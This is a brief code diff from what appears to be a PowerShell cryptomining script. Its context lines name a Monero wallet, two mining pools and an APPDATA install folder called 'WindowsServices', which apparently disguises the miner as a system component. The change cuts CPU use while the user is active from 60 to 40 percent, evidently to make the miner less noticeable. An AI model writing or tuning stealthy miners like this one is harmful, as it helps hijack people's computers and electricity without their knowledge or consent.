@@ -16,7 +16,7 @@ $wallet = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwp
 $pool = "pool.hashvault.pro:443"
 $poolBak = "pool.supportxmr.com:443"
 $idleCpu = 90
-$activeCpu = 60
+$activeCpu = 40
 $idleThreshold = 75
 
 $installDir = "$env:APPDATA\WindowsServices"
